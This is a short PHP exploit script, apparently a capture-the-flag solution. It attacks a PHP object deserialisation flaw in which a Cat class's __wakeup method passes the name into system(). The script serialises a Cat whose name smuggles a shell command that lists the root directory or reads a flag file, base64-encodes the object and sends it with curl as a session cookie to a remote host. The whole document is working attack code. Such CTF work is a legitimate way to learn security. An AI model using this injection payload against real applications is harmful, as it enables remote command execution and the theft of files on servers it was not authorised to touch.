<?php
    class Cat
    {
        public $name = '(guest cat)';
        function __construct($name)
        {
            $this->name = $name;
        }
        function __wakeup()
        {
            echo "<pre>";
            system("cowsay 'Welcome back, $this->name'");
            echo "</pre>";
        }
    }
    #$cat_session = base64_encode(serialize(new Cat("';ls /'")));
    #system("curl http://h4ck3r.quest:8601/ --cookie 'cat_session=".$cat_session."'");
    $cat_session = base64_encode(serialize(new Cat("';cat /flag_5fb2acebf1d0c558'")));
    system("curl http://h4ck3r.quest:8601/ --cookie 'cat_session=".$cat_session."'")
?>